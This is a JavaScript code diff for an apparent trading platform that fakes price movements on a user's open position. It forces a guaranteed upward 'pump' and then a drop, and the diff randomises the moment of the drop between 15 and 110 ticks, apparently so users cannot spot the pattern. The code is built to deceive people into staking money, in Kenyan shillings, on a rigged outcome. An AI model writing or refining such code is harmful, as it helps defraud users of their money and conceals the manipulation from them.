@@ -12,9 +12,11 @@ let customMinY = null;
 let customMaxY = null;
 
 // --- DYNAMIC CONTROL STATE FOR REVENUE AND PROFIT ENGINE ---
-let activeTradePosition = null; // Holds current trade metrics { entryPrice: X, stake: Y, targetAmount: Z }
+let activeTradePosition = null; // Holds current trade metrics { entryPrice: X, stake: Y, targetAmount: Z, customizedLossThreshold: W }
 let tradeTicksElapsed = 0;       // Counts ticks while position is running
-const SAFE_GROWTH_TICKS = 45;   // ~6.7 seconds of safe pump trajectory (45 updates * 150ms socket updates)
+
+// Setup a fallback base range in ticks (~6.7s) in case state is evaluated prior to initialization
+let currentTradeLossThreshold = 45; 
 
 // 2. Setup the Live Moving Graph (Chart.js)
 const ctx = document.getElementById('tradeChart').getContext('2d');
@@ -104,7 +106,8 @@ socket.on('market-update', (data) => {
     if (activeTradePosition) {
         tradeTicksElapsed++;
         
-        if (tradeTicksElapsed <= SAFE_GROWTH_TICKS) {
+        // Dynamically references the custom randomized threshold selected during execution initialization
+        if (tradeTicksElapsed <= activeTradePosition.customizedLossThreshold) {
             // PHASE 1: Guaranteed Bullish Pump. Force steps upwards so user investment grows up to 600 or 1000 KSh
             let growthPump = Math.floor(Math.random() * 2800 + 1200);
             finalRate = Math.abs(finalRate) + growthPump;
@@ -258,11 +261,19 @@ socket.on('trade-result', (data) => {
  */
 window.initializeActiveTradeState = (stakeAmount, currentRate) => {
     tradeTicksElapsed = 0;
+    
+    // Generates completely unexpected run times on every unique order placement
+    // Selection matrix chooses randomly between a short fast drop (15 ticks / ~2.2s) to extended climbs (110 ticks / ~16.5s)
+    let randomThresholdRoll = Math.floor(Math.random() * (110 - 15 + 1)) + 15;
+    
     activeTradePosition = {
         stake: parseFloat(stakeAmount) || 500,
         entryPrice: currentRate,
-        targetAmount: (parseFloat(stakeAmount) || 500) * 1.85
+        targetAmount: (parseFloat(stakeAmount) || 500) * 1.85,
+        customizedLossThreshold: randomThresholdRoll // Bound safely to this specific position instance
     };
+    
+    console.log(`[ENGINE] New positions tracking live. Target Drop Frame selected randomly at tick: ${randomThresholdRoll}`);
 };
 
 window.clearActiveTradeState = () => {
